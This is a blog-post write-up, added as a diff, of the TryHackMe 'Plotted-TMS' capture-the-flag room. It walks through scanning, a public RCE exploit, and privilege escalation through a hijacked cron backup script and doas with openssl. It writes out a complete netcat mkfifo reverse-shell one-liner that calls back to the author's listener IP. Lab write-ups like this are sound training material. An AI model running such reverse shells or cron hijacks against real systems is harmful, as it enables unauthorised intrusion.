@@ -1,0 +1,108 @@
+---
+title: "Plotted-TMS TryHackMe"
+date: "02-22-2022"
+author: "Reda BELHAJ"
+summary: "This writeup will cover the Plotted TMS room on TryHackMe. by @sa.infinity8888!"
+tags: ["TryHackMe", "Ctf", "Writeup"]
+image: "/images/TMS/bg.png"
+---
+Let’s take a look at the [Plotted-TMS CTF](https://tryhackme.com/room/plottedtms) on TryHackMe Created by **@sa.infinity8888**.
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.123.136 -sC -sS -Pn
+```
+The “Nmap Output” displayed `3` service running under port 80, 445 and 22.
+![Nmap](/images/TMS/nmap.JPG)
+
+### Dirsearch Scan
+I next decided to run a Dirsearch scan on the webserver to see if there were any interesting hidden directories, by the command:
+![disearch1](/images/TMS/disearch1.JPG)
+
+After we've completed our scan, we see
+![idRSA](/images/TMS/idRSA.JPG)
+And with the help of [CyberChef](https://gchq.github.io/CyberChef/) we found :
+
+```
+Trust me it is not this easy..now get back to enumeration :D
+```
+
+And we also found :
+![passwd](/images/TMS/passwd.JPG)
+That means:
+
+```
+not this easy :D
+```
+
+And Now I run the scan in the the webserver that is on port 445:
+![Nmap](/images/TMS/disearch2.JPG)
+
+And we found:
+![landing](/images/TMS/landing.JPG)
+![login](/images/TMS/login.JPG)
+
+## Exploiting
+Now let’s look for exploits that we can use.
+
+```
+searchsploit Traffic Offence Management System
+```
+![Searchsploit](/images/TMS/searchsploit.JPG)
+The Output displayed that there's **RCE**: Remote Code Execution, **SQLi**: SQL Injection, **XSS**: Cross-site scripting. And I've decide to go with the RCE vulnerability:
+![getExploit](/images/TMS/getExploit.JPG)
+
+And I modify the Exploit to:
+![modify](/images/TMS/modify.JPG)
+
+So it successfully did a RCE and uploaded a shell on the host :
+![done](/images/TMS/done.JPG)
+
+And I tried **ls** command on it:
+![testLS](/images/TMS/testLS.JPG)
+
+### Reverse Shell
+I set up my netcat listener on port 4444 and I fired up Burp and sent a POST request with the following encoded payload using URL encoding:
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
+```
+![burp](/images/TMS/burp.JPG)
+
+**Great!** I received a reverse connection on my port 4444. And I've upgraded the shell: 
+![shell](/images/TMS/shell.JPG)
+
+### Database Discovery
+Now we're in the machine and I decided to take a look at the `initialize.php` file which gave me the username and the password for accessing the database:
+![initPHP](/images/TMS/initPHP.JPG)
+
+Then I tried to connect to the database using the credentials of last file. And I found some **Password Hashs**:
+![mysql1](/images/TMS/mysql1.JPG)
+![mysql2](/images/TMS/mysql2.JPG)
+
+## User Flag
+Inside the home directory of the `plot_admin` user. I notice a file called `user.txt` but I didn't have the rights to access it. 
+![permDenied](/images/TMS/permDenied.JPG)
+
+As I was exploring I tried to look at the contab file:
+![crontab](/images/TMS/crontab.JPG)
+
+**Interesting** we found a script called `backup`.
+![crontab](/images/TMS/backup.JPG)
+
+Then I tried to remove the original backup script and rewrite another one that will help me get a reverse shell with [reverse-shell-generator](https://www.revshells.com/):
+![backup2](/images/TMS/backup2.JPG)
+
+And when I run `date` command I got a shell on my listner, and I got the flag:
+![userFLAG](/images/TMS/userFLAG.JPG)
+
+## Root Flag
+Now it’s time to escalate our privileges and get the root flag. 
+![SUDO1](/images/TMS/SUDO1.JPG)
+![SUDO2](/images/TMS/SUDO2.JPG)
+
+So as a result of `find / -perm -u=s -type f 2>/dev/null` we found that we can run ***doas*** as root. And after some research I found that I can only openssl with the root privilege and I followed the steps of [GTFObins](https://gtfobins.github.io/) :
+![SUDO2](/images/TMS/DOAS.JPG)
